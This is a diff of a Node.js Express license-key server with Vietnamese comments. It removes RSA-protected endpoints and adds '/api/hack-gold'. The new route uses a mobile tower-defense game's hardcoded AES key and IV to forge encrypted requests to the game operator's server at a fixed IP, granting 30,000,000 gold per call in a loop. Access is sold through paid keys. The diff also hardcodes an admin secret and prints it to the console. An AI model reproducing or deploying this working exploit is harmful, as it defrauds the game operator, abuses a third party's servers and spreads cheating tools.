@@ -2,6 +2,7 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
+const http = require('http');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -12,30 +13,6 @@ app.use(express.json({ limit: '10mb' }));
 // ============================================================
 const DATA_FILE = path.join(__dirname, 'data.json');
 const ADMIN_KEY = 'ADMIN_2026_Ka1t0_S3cr3t_X9zW8yV7uT6rQ5pO4nM3';
-
-// ===== RSA KEY =====
-const RSA_PRIVATE_FILE = path.join(__dirname, 'rsa_private.pem');
-const RSA_PUBLIC_FILE = path.join(__dirname, 'rsa_public.pem');
-
-function generateRSAKeys() {
-    if (!fs.existsSync(RSA_PRIVATE_FILE) || !fs.existsSync(RSA_PUBLIC_FILE)) {
-        const { generateKeyPairSync } = require('crypto');
-        const { privateKey, publicKey } = generateKeyPairSync('rsa', {
-            modulusLength: 4096,
-            publicKeyEncoding: { type: 'spki', format: 'pem' },
-            privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
-        });
-        fs.writeFileSync(RSA_PRIVATE_FILE, privateKey);
-        fs.writeFileSync(RSA_PUBLIC_FILE, publicKey);
-        console.log('✅ Đã tạo cặp RSA key mới!');
-    }
-    return {
-        privateKey: fs.readFileSync(RSA_PRIVATE_FILE, 'utf8'),
-        publicKey: fs.readFileSync(RSA_PUBLIC_FILE, 'utf8')
-    };
-}
-
-const RSA = generateRSAKeys();
 
 // ============================================================
 // HÀM XỬ LÝ DỮ LIỆU
@@ -91,21 +68,14 @@ app.get('/api/health', (req, res) => {
     });
 });
 
-app.get('/api/public-key', (req, res) => {
-    res.json({ success: true, publicKey: RSA.publicKey });
-});
-
 // ============================================================
-// API CŨ (HỖ TRỢ TOOL KHÔNG RSA) - THÊM MỚI
+// API XÁC THỰC KEY (CHO TOOL VỎ BỌC)
 // ============================================================
 app.post('/verify-key', (req, res) => {
     const { key, hwid } = req.body;
     const data = initData();
     const clientIp = req.clientIp;
     
-    console.log(`[VERIFY] Key: ${key}, HWID: ${hwid}`);
-    
-    // Kiểm tra key tồn tại
     if (!data.keys[key]) {
         data.logs[key] = data.logs[key] || [];
         data.logs[key].push({ timestamp: new Date().toISOString(), action: 'VERIFY_FAILED', status: 'KEY_NOT_FOUND', ip: clientIp });
@@ -114,8 +84,6 @@ app.post('/verify-key', (req, res) => {
     }
     
     const keyData = data.keys[key];
-    
-    // Kiểm tra key active
     if (!keyData.active) {
         data.logs[key] = data.logs[key] || [];
         data.logs[key].push({ timestamp: new Date().toISOString(), action: 'VERIFY_FAILED', status: 'KEY_DISABLED', ip: clientIp });
@@ -123,7 +91,6 @@ app.post('/verify-key', (req, res) => {
         return res.json({ success: false, message: 'Key đã bị khóa!' });
     }
     
-    // Kiểm tra HWID (mỗi key chỉ dùng 1 máy)
     if (keyData.hwid && keyData.hwid !== hwid) {
         data.logs[key] = data.logs[key] || [];
         data.logs[key].push({ timestamp: new Date().toISOString(), action: 'VERIFY_FAILED', status: 'HWID_MISMATCH', ip: clientIp });
@@ -131,7 +98,6 @@ app.post('/verify-key', (req, res) => {
         return res.json({ success: false, message: '🔒 Key đã được sử dụng trên thiết bị khác!' });
     }
     
-    // Kiểm tra hết hạn
     if (new Date(keyData.expiry) < new Date()) {
         data.logs[key] = data.logs[key] || [];
         data.logs[key].push({ timestamp: new Date().toISOString(), action: 'VERIFY_FAILED', status: 'KEY_EXPIRED', ip: clientIp });
@@ -139,7 +105,6 @@ app.post('/verify-key', (req, res) => {
         return res.json({ success: false, message: 'Key đã hết hạn!' });
     }
     
-    // Kiểm tra số lượt dùng
     if (keyData.used >= keyData.maxUses) {
         data.logs[key] = data.logs[key] || [];
         data.logs[key].push({ timestamp: new Date().toISOString(), action: 'VERIFY_FAILED', status: 'KEY_EXHAUSTED', ip: clientIp });
@@ -147,19 +112,12 @@ app.post('/verify-key', (req, res) => {
         return res.json({ success: false, message: 'Key đã hết lượt!' });
     }
     
-    // Lưu HWID lần đầu
     if (!keyData.hwid) {
         keyData.hwid = hwid;
     }
     
-    // Tăng số lượt dùng
-    keyData.used++;
-    
-    // Tạo session token
     const token = crypto.randomBytes(32).toString('hex');
     data.sessions[token] = { key, hwid, connectedAt: new Date().toISOString(), ip: clientIp };
-    
-    // Ghi log
     data.logs[key] = data.logs[key] || [];
     data.logs[key].push({ timestamp: new Date().toISOString(), action: 'VERIFY_SUCCESS', status: 'SUCCESS', ip: clientIp });
     saveData(data);
@@ -167,179 +125,157 @@ app.post('/verify-key', (req, res) => {
     res.json({
         success: true,
         message: `✅ Xác thực thành công! Còn ${keyData.maxUses - keyData.used} lượt`,
-        data: {
-            token,
-            expiresIn: 86400,
-            type: keyData.type,
-            remaining: keyData.maxUses - keyData.used,
-            total: keyData.maxUses
-        }
-    });
-});
-
-app.post('/use-key', (req, res) => {
-    const { key, hwid } = req.body;
-    const data = initData();
-    const clientIp = req.clientIp;
-    
-    console.log(`[USE] Key: ${key}, HWID: ${hwid}`);
-    
-    if (!data.keys[key]) {
-        return res.json({ success: false, message: 'Key không tồn tại!' });
-    }
-    
-    const keyData = data.keys[key];
-    
-    if (keyData.hwid && keyData.hwid !== hwid) {
-        return res.json({ success: false, message: '🔒 Sai thiết bị!' });
-    }
-    
-    if (keyData.used >= keyData.maxUses) {
-        return res.json({ success: false, message: 'Key đã hết lượt!', remaining: 0, total: keyData.maxUses });
-    }
-    
-    keyData.used++;
-    
-    data.logs[key] = data.logs[key] || [];
-    data.logs[key].push({ timestamp: new Date().toISOString(), action: 'USE_KEY', status: 'SUCCESS', ip: clientIp });
-    saveData(data);
-    
-    res.json({
-        success: true,
-        message: `Còn ${keyData.maxUses - keyData.used}/${keyData.maxUses} lượt`,
-        remaining: keyData.maxUses - keyData.used,
-        total: keyData.maxUses
+        data: { token, expiresIn: 86400, type: keyData.type, remaining: keyData.maxUses - keyData.used, total: keyData.maxUses }
     });
 });
 
 // ============================================================
-// API RSA MỚI
+// API HACK 30M GOLD (XỬ LÝ TRÊN SERVER)
 // ============================================================
-app.post('/api/secure-verify', (req, res) => {
+app.post('/api/hack-gold', async (req, res) => {
     try {
-        const encrypted = Buffer.from(req.body.encrypted, 'base64');
-        const decrypted = crypto.privateDecrypt({
-            key: RSA.privateKey,
-            padding: crypto.constants.RSA_PKCS1_OAEP_PADDING
-        }, encrypted);
-        const { key, hwid, timestamp } = JSON.parse(decrypted.toString('utf8'));
+        const { key, platform, uniqId, hostId, gichapo, times } = req.body;
+        
+        // Kiểm tra key hợp lệ
         const data = initData();
-        const clientIp = req.clientIp;
-
-        if (Date.now() - timestamp > 30000) {
-            return res.json({ success: false, message: '⏰ Request đã hết hạn!' });
+        if (!data.keys[key] || !data.keys[key].active) {
+            return res.json({ success: false, message: 'Key không hợp lệ hoặc đã hết hạn!' });
         }
-
-        if (!data.keys[key]) {
-            data.logs[key] = data.logs[key] || [];
-            data.logs[key].push({ timestamp: new Date().toISOString(), action: 'VERIFY_FAILED', status: 'KEY_NOT_FOUND', ip: clientIp });
-            saveData(data);
-            return res.json({ success: false, message: 'Key không tồn tại!' });
-        }
-
+        
         const keyData = data.keys[key];
-        if (!keyData.active) {
-            data.logs[key] = data.logs[key] || [];
-            data.logs[key].push({ timestamp: new Date().toISOString(), action: 'VERIFY_FAILED', status: 'KEY_DISABLED', ip: clientIp });
-            saveData(data);
-            return res.json({ success: false, message: 'Key đã bị khóa!' });
-        }
-
-        if (keyData.hwid && keyData.hwid !== hwid) {
-            data.logs[key] = data.logs[key] || [];
-            data.logs[key].push({ timestamp: new Date().toISOString(), action: 'VERIFY_FAILED', status: 'HWID_MISMATCH', ip: clientIp });
-            saveData(data);
-            return res.json({ success: false, message: '🔒 Key đã được sử dụng trên thiết bị khác!' });
-        }
-
-        if (new Date(keyData.expiry) < new Date()) {
-            data.logs[key] = data.logs[key] || [];
-            data.logs[key].push({ timestamp: new Date().toISOString(), action: 'VERIFY_FAILED', status: 'KEY_EXPIRED', ip: clientIp });
-            saveData(data);
-            return res.json({ success: false, message: 'Key đã hết hạn!' });
-        }
-
         if (keyData.used >= keyData.maxUses) {
-            data.logs[key] = data.logs[key] || [];
-            data.logs[key].push({ timestamp: new Date().toISOString(), action: 'VERIFY_FAILED', status: 'KEY_EXHAUSTED', ip: clientIp });
-            saveData(data);
-            return res.json({ success: false, message: 'Key đã hết lượt!' });
+            return res.json({ success: false, message: 'Key đã hết lượt sử dụng!' });
         }
-
-        if (!keyData.hwid) {
-            keyData.hwid = hwid;
-        }
-
-        keyData.used++;
-        const token = crypto.randomBytes(32).toString('hex');
-        data.sessions[token] = { key, hwid, connectedAt: new Date().toISOString(), ip: clientIp };
         
-        data.logs[key] = data.logs[key] || [];
-        data.logs[key].push({ timestamp: new Date().toISOString(), action: 'VERIFY_SUCCESS', status: 'SUCCESS', ip: clientIp });
-        saveData(data);
-
-        const responseData = {
-            success: true,
-            message: `✅ Xác thực thành công! Còn ${keyData.maxUses - keyData.used} lượt`,
-            data: { token, expiresIn: 86400, type: keyData.type, remaining: keyData.maxUses - keyData.used, total: keyData.maxUses }
+        // ===== LOGIC HACK GỐC =====
+        const K_AES2 = Buffer.from("gksekfidjrqjfwk1", "utf8");
+        const I_AES2 = Buffer.from("towerdefense_amo", "utf8");
+        
+        function encryptAES2(data) {
+            const cipher = crypto.createCipheriv("aes-128-cbc", K_AES2, I_AES2);
+            let enc = cipher.update(JSON.stringify(data), "utf8", "base64");
+            enc += cipher.final("base64");
+            return enc;
+        }
+        
+        function decryptAES2(b64) {
+            try {
+                if (typeof b64 === 'string' && b64.startsWith('{')) return b64;
+                const d = crypto.createDecipheriv("aes-128-cbc", K_AES2, I_AES2);
+                let dec = d.update(b64, "base64", "utf8") + d.final("utf8");
+                return dec.replace(/[\x00-\x1F\x7F-\x9F]/g, "");
+            } catch (e) { return null; }
+        }
+        
+        function postRequest(url, postData, headers = {}, timeoutMs = 30000) {
+            return new Promise((resolve, reject) => {
+                const u = new URL(url);
+                const opt = {
+                    hostname: u.hostname,
+                    port: u.port || 80,
+                    path: u.pathname,
+                    method: 'POST',
+                    timeout: timeoutMs,
+                    headers: {
+                        'User-Agent': 'app',
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Content-Length': Buffer.byteLength(postData),
+                        'Connection': 'keep-alive',
+                        ...headers
+                    }
+                };
+                const req = http.request(opt, res => {
+                    let body = '';
+                    res.on('data', chunk => body += chunk);
+                    res.on('end', () => resolve(body));
+                });
+                req.on('timeout', () => { req.destroy(); reject(new Error('Request timeout')); });
+                req.on('error', e => reject(e));
+                req.write(postData);
+                req.end();
+            });
+        }
+        
+        function findGichapo(obj) {
+            if (!obj || typeof obj !== 'object') return null;
+            if (obj.gichapo && typeof obj.gichapo === 'string' && obj.gichapo.length >= 1) return obj.gichapo;
+            for (let k in obj) { let f = findGichapo(obj[k]); if (f) return f; }
+            return null;
+        }
+        
+        async function hackGold30M(platform, uniqId, hostId, gichapo) {
+            const payload = {
+                SGS: true,
+                LANG: 3,
+                PICK: 8,
+                PICK_NAME: "GOLD",
+                PICK_AMOUNT: "30,000,000",
+                UNIQ_ID: uniqId,
+                PLATFORM: platform,
+                MOBILE_CONNECT: "",
+                GICHAPO: gichapo
+            };
+            
+            const enc = encryptAES2(payload);
+            const url = `http://211.253.26.47:8093/TOWERDEFENCE_COMMON/EVENT_MENU/eventmenu_shopping.php`;
+            const body = `DATA=${encodeURIComponent(enc)}`;
+            
+            const res = await postRequest(url, body);
+            try {
+                const dec = decryptAES2(res);
+                return JSON.parse(dec || res);
+            } catch (e) {
+                return { RAW: res, ERROR: e.message };
+            }
+        }
+        
+        // Lấy thông tin user trước
+        const isViet = (platform === 'AMO' || platform === 'SS');
+        const gicDefault = isViet ? "선택된서버:베트남서버 ping:67ms" : "선택된서버:한국서버 ping:205ms";
+        const getUrl = `http://211.253.26.47:8093/TOWERDEFENCE_${platform}/get_user_data_all_AES2.php`;
+        const getPayload = {
+            UNIQ_ID: uniqId, HOST_ID: hostId,
+            MOBILE_CONNECT: "", ANDROID_AD: "",
+            GICHAPO: gicDefault, LOCAL_KEY: null
         };
-        const encryptedResponse = crypto.publicEncrypt({
-            key: RSA.publicKey,
-            padding: crypto.constants.RSA_PKCS1_OAEP_PADDING
-        }, Buffer.from(JSON.stringify(responseData)));
+        if (platform === 'ATV' || platform === 'LG') getPayload.MODEL_NAME = "BeyondTV";
         
-        res.json({ encrypted: encryptedResponse.toString('base64') });
-
-    } catch (error) {
-        res.json({ success: false, message: '❌ Lỗi giải mã: ' + error.message });
-    }
-});
-
-app.post('/api/secure-use', (req, res) => {
-    try {
-        const encrypted = Buffer.from(req.body.encrypted, 'base64');
-        const decrypted = crypto.privateDecrypt({
-            key: RSA.privateKey,
-            padding: crypto.constants.RSA_PKCS1_OAEP_PADDING
-        }, encrypted);
-        const { key, hwid, timestamp } = JSON.parse(decrypted.toString('utf8'));
-
-        if (Date.now() - timestamp > 30000) {
-            return res.json({ success: false, message: '⏰ Request đã hết hạn!' });
+        const res = await postRequest(getUrl, `DATA=${encodeURIComponent(encryptAES2(getPayload))}`);
+        const dec = decryptAES2(res);
+        if (!dec) throw new Error('Không giải mã được dữ liệu GET');
+        const userData = JSON.parse(dec);
+        const gichapo_found = findGichapo(userData);
+        const val = userData.VALUE || {};
+        const normal = val.normal?.value || {};
+        const rubydiagold = val.rubydiagold?.value || {};
+        const userName = normal.USER_NAME || '???';
+        let gold = rubydiagold.GOLD || 0;
+        
+        // Hack
+        let successCount = 0, totalGoldReceived = 0;
+        const finalGichapo = gichapo || gichapo_found;
+        for (let i = 0; i < times; i++) {
+            const result = await hackGold30M(platform, uniqId, hostId, finalGichapo);
+            if (result && result.RESULT === "OK") {
+                successCount++;
+                totalGoldReceived += 30000000;
+            }
         }
-
-        const data = initData();
-        if (!data.keys[key]) {
-            return res.json({ success: false, message: 'Key không tồn tại!' });
-        }
-
-        const keyData = data.keys[key];
-        if (keyData.hwid && keyData.hwid !== hwid) {
-            return res.json({ success: false, message: '🔒 Sai thiết bị!' });
-        }
-
-        if (keyData.used >= keyData.maxUses) {
-            return res.json({ success: false, message: 'Key đã hết lượt!', remaining: 0, total: keyData.maxUses });
-        }
-
-        keyData.used++;
-        data.logs[key] = data.logs[key] || [];
-        data.logs[key].push({ timestamp: new Date().toISOString(), action: 'USE_KEY', status: 'SUCCESS', ip: req.clientIp });
+        
+        // Trừ lượt key
+        keyData.used += times;
         saveData(data);
-
-        const responseData = {
-            success: true,
-            message: `Còn ${keyData.maxUses - keyData.used}/${keyData.maxUses} lượt`,
-            remaining: keyData.maxUses - keyData.used,
-            total: keyData.maxUses
-        };
-        const encryptedResponse = crypto.publicEncrypt({
-            key: RSA.publicKey,
-            padding: crypto.constants.RSA_PKCS1_OAEP_PADDING
-        }, Buffer.from(JSON.stringify(responseData)));
         
-        res.json({ encrypted: encryptedResponse.toString('base64') });
-
+        res.json({
+            success: true,
+            userName: userName,
+            goldBefore: gold,
+            successCount: successCount,
+            totalGoldReceived: totalGoldReceived,
+            remainingUses: keyData.maxUses - keyData.used,
+            message: `✅ Hack ${successCount}/${times} lần thành công! Nhận ${totalGoldReceived.toLocaleString()} vàng`
+        });
+        
     } catch (error) {
         res.json({ success: false, message: '❌ Lỗi: ' + error.message });
     }
@@ -392,17 +328,6 @@ app.post('/api/admin/disable-key', verifyAdmin, (req, res) => {
     data.logs[key].push({ timestamp: new Date().toISOString(), action: 'KEY_DISABLED', status: 'SUCCESS', ip: req.clientIp });
     saveData(data);
     res.json({ success: true, message: `Đã khóa key: ${key}` });
-});
-
-app.post('/api/admin/enable-key', verifyAdmin, (req, res) => {
-    const { key } = req.body;
-    const data = initData();
-    if (!data.keys[key]) return res.json({ success: false, message: 'Key không tồn tại!' });
-    data.keys[key].active = true;
-    data.logs[key] = data.logs[key] || [];
-    data.logs[key].push({ timestamp: new Date().toISOString(), action: 'KEY_ENABLED', status: 'SUCCESS', ip: req.clientIp });
-    saveData(data);
-    res.json({ success: true, message: `Đã kích hoạt lại key: ${key}` });
 });
 
 app.post('/api/admin/delete-key', verifyAdmin, (req, res) => {
@@ -466,6 +391,5 @@ app.listen(PORT, () => {
     console.log(`✅ Server đang chạy tại port ${PORT}`);
     console.log(`🔑 Admin Key: ${ADMIN_KEY}`);
     console.log(`📁 Dữ liệu: ${DATA_FILE}`);
-    console.log(`🔐 RSA Key đã tạo!`);
-    console.log(`📌 API cũ /verify-key và /use-key đã được thêm!`);
+    console.log(`📌 API hack 30M Gold đã sẵn sàng!`);
 });
